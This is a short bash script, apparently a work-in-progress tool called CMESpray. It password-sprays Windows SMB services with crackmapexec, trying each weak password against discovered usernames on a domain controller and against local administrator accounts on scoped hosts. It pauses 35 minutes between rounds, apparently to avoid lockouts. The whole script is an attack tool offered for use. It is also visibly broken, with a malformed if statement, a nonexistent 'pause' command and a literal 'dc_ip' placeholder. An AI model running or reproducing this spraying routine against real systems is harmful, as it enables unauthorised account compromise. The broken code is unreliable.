#! /bin/bash
##work in progress - do not use in production - 8/1/2023
##required github.com/dodiorne/lists
##define scope.txt in ~
##
echo "  /$$$$$$  /$$      /$$ /$$$$$$$$  /$$$$$$                                        ";
echo " /$$__  $$| $$$    /$$$| $$_____/ /$$__  $$                                       ";
echo "| $$  \__/| $$$$  /$$$$| $$      | $$  \__/  /$$$$$$   /$$$$$$  /$$$$$$  /$$   /$$";
echo "| $$      | $$ $$/$$ $$| $$$$$   |  $$$$$$  /$$__  $$ /$$__  $$|____  $$| $$  | $$";
echo "| $$      | $$  $$$| $$| $$__/    \____  $$| $$  \ $$| $$  \__/ /$$$$$$$| $$  | $$";
echo "| $$    $$| $$\  $ | $$| $$       /$$  \ $$| $$  | $$| $$      /$$__  $$| $$  | $$";
echo "|  $$$$$$/| $$ \/  | $$| $$$$$$$$|  $$$$$$/| $$$$$$$/| $$     |  $$$$$$$|  $$$$$$$";
echo " \______/ |__/     |__/|________/ \______/ | $$____/ |__/      \_______/ \____  $$";
echo "                                           | $$                          /$$  | $$";
echo "                                           | $$                         |  $$$$$$/";
echo "                                           |__/                          \______/ ";
echo "                                                                                  ";
echo "                                                                                  ";
echo "                                                                                  ";
echo "                                                                                  ";
echo "local (y/n): $1";
# setup local auth if $1 = y or Y
if [$1 = "y"] || [$1="Y"]; l="--local-auth"; else l=""
echo $l
pause
for i in $(cat lists/weak_passwords.txt); do crackmapexec smb "dc_ip" -u discovered-usernames.txt -p $i --continue-on-success; echo sleeping; t=2100;while [ $t -gt 0 ];do printf "\rTime left: %02d:%02d" $((t/60)) $((t%60));sleep 1;t=$((t-1));done;echo -e "Sleeping";done

##local auth
for i in $(cat ~/lists/weak_passwords.txt); do crackmapexec smb ~/scope.txt --local-auth -u administrator -p $i --continue-on-success; echo sleeping; t=2100;while [ $t -gt 0 ];do printf "\rTime left: %02d:%02d" $((t/60)) $((t%60));sleep 1;t=$((t-1));done;echo -e "Sleeping";done

